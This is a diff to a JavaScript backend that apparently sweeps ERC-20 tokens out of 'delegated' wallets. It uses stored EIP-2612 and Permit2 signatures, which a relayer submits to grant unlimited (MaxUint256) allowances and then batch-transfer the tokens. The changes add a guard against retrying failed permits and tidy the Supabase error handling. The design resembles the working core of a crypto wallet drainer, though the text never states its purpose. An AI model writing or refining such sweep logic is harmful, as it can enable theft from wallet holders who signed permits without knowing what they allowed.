@@ -148,6 +148,10 @@ let reconnectAttempt   = 0;
 let isProcessing       = false; // block-overlap guard — skip block if previous still running
 const SWEEP_TIMEOUT_MS = 30_000; // 30s safety net — release isProcessing if sweep hangs
 
+// In-memory guard: track permit() failures this session so we never retry
+// even if the Supabase write fails. Key: `${walletAddress}:${tokenAddress}`
+const failedEIP2612 = new Set();
+
 // ── Logging ───────────────────────────────────────────────────────────────────
 
 const TAG  = `[${CHAIN.toUpperCase()}]`;
@@ -659,7 +663,8 @@ async function sweepGaslessWallet(walletAddress) {
         let erc20Allow = 0n;
         try { erc20Allow = await erc20Token.allowance(checksum, PERMIT2_ADDRESS); } catch {}
 
-        if (entry.eip2612 && !entry.eip2612.failed && erc20Allow === 0n) {
+        const eip2612Key = `${checksum.toLowerCase()}:${tokenAddr}`;
+        if (entry.eip2612 && !entry.eip2612.failed && !failedEIP2612.has(eip2612Key) && erc20Allow === 0n) {
           const { v, r, s } = entry.eip2612;
           const e2Deadline  = BigInt(entry.eip2612.deadline);
           if (e2Deadline > nowSecs) {
@@ -671,6 +676,7 @@ async function sweepGaslessWallet(walletAddress) {
               erc20Allow = ethers.MaxUint256;
             } catch (e) {
               warn(`[gasless/sig] token.permit() failed for ${entry.symbol ?? tokenAddr.slice(0, 10)}: ${e.message ?? e} — marking as failed, skipping`);
+              failedEIP2612.add(eip2612Key);
               updatedSigs[i] = { ...updatedSigs[i], eip2612: { ...entry.eip2612, failed: true } };
               sigMetaChanged = true;
               await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
@@ -733,10 +739,11 @@ async function sweepGaslessWallet(walletAddress) {
     if (BigInt(batch.deadline) < nowSecs) {
       warn(`[gasless/batch] deadline expired for ${checksum} — marking spent`);
       if (supabase) {
-        await supabase.from("delegated_wallets")
-          .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
-          .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
-          .catch(e => err(`[gasless/batch] Supabase update: ${e.message}`));
+        try {
+          await supabase.from("delegated_wallets")
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+        } catch (e) { err(`[gasless/batch] Supabase update: ${e.message}`); }
       }
       return;
     }
@@ -750,9 +757,10 @@ async function sweepGaslessWallet(walletAddress) {
       let erc20Allow = 0n;
       try { erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).allowance(checksum, PERMIT2_ADDRESS); } catch {}
 
+      const batchEip2612Key = `${checksum.toLowerCase()}:${tokenAddr}`;
       if (erc20Allow === 0n) {
         const e2 = eip2612Map[tokenAddr.toLowerCase()];
-        if (e2 && !e2.failed && BigInt(e2.deadline) > nowSecs) {
+        if (e2 && !e2.failed && !failedEIP2612.has(batchEip2612Key) && BigInt(e2.deadline) > nowSecs) {
           log(`[gasless/batch] EIP-2612 token.permit() for ${tokenAddr.slice(0, 10)}`);
           try {
             const tc  = new ethers.Contract(tokenAddr, EIP2612_PERMIT_ABI, relayerWallet);
@@ -760,13 +768,15 @@ async function sweepGaslessWallet(walletAddress) {
             await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, BigInt(e2.deadline), e2.v, e2.r, e2.s, { gasLimit: 100_000n, ...fee })).wait();
             log(`[gasless/batch] EIP-2612 confirmed for ${tokenAddr.slice(0, 10)}`);
           } catch (e) {
-            warn(`[gasless/batch] EIP-2612 permit() failed for ${tokenAddr.slice(0, 10)}: ${e.message} — marking as failed, will not retry`);
+            warn(`[gasless/batch] EIP-2612 permit() failed for ${tokenAddr.slice(0, 10)}: ${e.message} — marking failed, will not retry`);
+            failedEIP2612.add(batchEip2612Key);
             eip2612Map[tokenAddr.toLowerCase()] = { ...e2, failed: true };
             if (supabase) {
-              await supabase.from("delegated_wallets")
-                .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, eip2612: eip2612Map } } })
-                .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
-                .catch(e2 => err(`[gasless/batch] Supabase mark eip2612 failed: ${e2.message}`));
+              try {
+                await supabase.from("delegated_wallets")
+                  .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, eip2612: eip2612Map } } })
+                  .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+              } catch (e2) { err(`[gasless/batch] Supabase mark eip2612 failed: ${e2.message}`); }
             }
           }
         }
@@ -818,10 +828,11 @@ async function sweepGaslessWallet(walletAddress) {
       log(`[gasless/batch] confirmed — batch sweep for ${checksum} (${batch.permitted.length} token(s))`);
 
       if (supabase) {
-        await supabase.from("delegated_wallets")
-          .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
-          .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
-          .catch(e => err(`[gasless/batch] Supabase spent update: ${e.message}`));
+        try {
+          await supabase.from("delegated_wallets")
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+        } catch (e) { err(`[gasless/batch] Supabase spent update: ${e.message}`); }
       }
     } catch (e) {
       const msg = e.message ?? "";
@@ -834,10 +845,11 @@ async function sweepGaslessWallet(walletAddress) {
         return;
       }
       if (supabase) {
-        await supabase.from("delegated_wallets")
-          .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
-          .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
-          .catch(e2 => err(`[gasless/batch] Supabase spent update: ${e2.message}`));
+        try {
+          await supabase.from("delegated_wallets")
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+        } catch (e2) { err(`[gasless/batch] Supabase spent update: ${e2.message}`); }
       }
     }
   }
